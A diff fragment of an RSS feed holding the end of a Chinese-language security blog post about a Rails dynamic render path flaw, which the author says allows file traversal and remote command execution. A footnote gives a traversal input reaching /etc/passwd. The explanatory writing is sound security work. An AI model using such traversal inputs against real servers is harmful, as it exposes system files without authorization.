+&lt;p&gt;Ruby on Rails 能讓開發者較輕鬆的開發出安全的應用程式，然而，若開發者不注意，還是有可能寫出嚴重的漏洞。本文的動態樣板路徑就是這樣一個例子，它不只是 OWASP 所描述的可以存取任意模版而已，它可以遍歷檔案，甚至因為 rails 預設的 template handler 是 ERB，造成遠端命令執行讓攻擊者取得伺服器操作權。&lt;/p&gt;
+
+&lt;p&gt;這個例子又再次驗證，框架可以幫助大家快速開發，增加安全度。但唯有良好的安全意識，才是應用程式安全的基石。&lt;/p&gt;
+
+&lt;h3 id=&quot;section-5&quot;&gt;註解&lt;/h3&gt;
+
+&lt;div class=&quot;footnotes&quot;&gt;
+  &lt;ol&gt;
+    &lt;li id=&quot;fn:note1&quot;&gt;
+      &lt;p&gt;Dynamic Render Paths 目前並沒有中文翻譯，因為問題之精髓在於要產生的樣板路徑是可變動的，因此筆者認為動態樣板路徑這個翻譯較為貼切。 &lt;a href=&quot;#fnref:note1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:note2&quot;&gt;
+      &lt;p&gt;筆者測試的環境為 Rails 4.1.4，其他 Rails 版本有可能需要用 ../../../../../etc/passwd 跳脫目前目錄。 &lt;a href=&quot;#fnref:note2&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+  &lt;/ol&gt;
+&lt;/div&gt;
+</description>
+                <link>http://devco.re/blog/2015/07/24/the-vulnerability-of-dynamic-render-paths-in-rails/</link>
+                <guid>http://devco.re/blog/2015/07/24/the-vulnerability-of-dynamic-render-paths-in-rails</guid>
+                <pubDate>Fri, 24 Jul 2015 00:00:00 +0800</pubDate>
+        </item>
 
         <item>
                 <title>談 Cookie 認證安全－以宏碁雲端售票為例</title>
